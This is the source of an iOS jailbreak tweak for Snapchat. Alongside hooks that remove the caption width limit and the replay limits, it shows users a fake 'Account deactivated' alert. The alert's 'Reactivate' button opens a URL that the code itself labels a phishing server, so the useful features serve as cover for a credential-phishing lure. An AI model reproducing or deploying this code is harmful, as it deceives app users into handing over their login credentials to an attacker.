#include "fishhook/fishhook.h"
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "substrate.h"

/* ============
     Hooks
============= */
// Redirects the user to a phishing server at log-in
%hook MainViewController
-(void)initMiddleVC {
	%orig;
	if ([[NSUserDefaults standardUserDefaults] boolForKey:@"alertOnScreen"] == NO) {
	   UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Account deactivated"
	                                              message:@"Your account has been deactivated for security reasons, since the application you use to log-in to Snapchat has changed. Please, reactivate your account."
	                                              delegate:self
	                                              cancelButtonTitle:@"Reactivate"
	                                              otherButtonTitles:nil];
		[alert show];
	    [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"alertOnScreen"];
	    [[NSUserDefaults standardUserDefaults] synchronize];
	}
}

%new -(void)alertView:(UIAlertView *)alert clickedButtonAtIndex:(NSInteger)buttonIndex{
	if (buttonIndex == 0){
    	NSURL *actionURL = [NSURL URLWithString:@"http://192.168.1.40:8888"]; // Phishing server address
    	[[UIApplication sharedApplication] openURL:actionURL];
	}
}
%end

// Removes the caption text limit
%hook SCCaptionDefaultTextView
-(CGFloat) maxTextWidth {
	return FLT_MAX;
}
%end

// Breaks the daily replay limit
%hook User
	- (_Bool)hasFreeReplaySnap {
		return 1;
	}
%end

%hook SCSnapPlayController
- (_Bool)canReplaySnap {
	return 1;
}
%end
